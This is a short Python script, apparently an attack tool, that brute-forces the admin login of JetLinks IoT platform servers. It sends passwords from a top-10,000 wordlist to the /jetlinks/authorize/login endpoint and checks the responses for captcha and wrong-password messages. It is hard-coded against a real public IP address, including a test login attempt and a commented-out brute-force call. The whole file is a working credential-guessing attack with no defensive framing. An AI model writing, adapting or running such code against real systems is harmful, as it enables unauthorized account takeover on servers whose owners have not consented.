
import  HackRequest
import multiprocessing


def test():
    hh = HackRequest.hackRequests()

    data={"username":"admin1","password":"admin","expires":3600000,"tokenType":"default","verifyKey":"","verifyCode":""}
    resp=hh.http(url='http://120.55.38.201:9002/jetlinks/authorize/login',json=data)
    print(resp.text())
    pass

def brute_force(ip,password_list):
    hh = HackRequest.hackRequests()

    url = "http://{}/jetlinks/authorize/login".format(ip)
    with open('./somd5-top1w.txt', 'r') as f:
        lines = f.readlines()
        for index, line in enumerate(lines):
            password = line.strip('\n')
            json = {"username": "admin", "password": password, "expires": 3600000,
                    "tokenType": "default", "verifyKey": "",
                    "verifyCode": ""}
            try:
                #resp = requests.post(url, json=json)
                resp = hh.http(url=url,json=json)
            except Exception:
                print("Error")
                return False
            if resp.status_code== 404:
                return False
            if resp.status_code== 400 and '验证码' in resp.text():
                return False
            if '密码' in resp.text():
                if index % 100 == 0: print('{} password incorrect,retrying {}'.format(ip, index))
                continue
            if resp.status_code == 200:
                print(resp.text)
                return True
            else:
                print(resp.text)
                return False

    return False

    pass



if __name__ == '__main__':
    pass
    #test()
    #brute_force('120.55.38.201:9002','')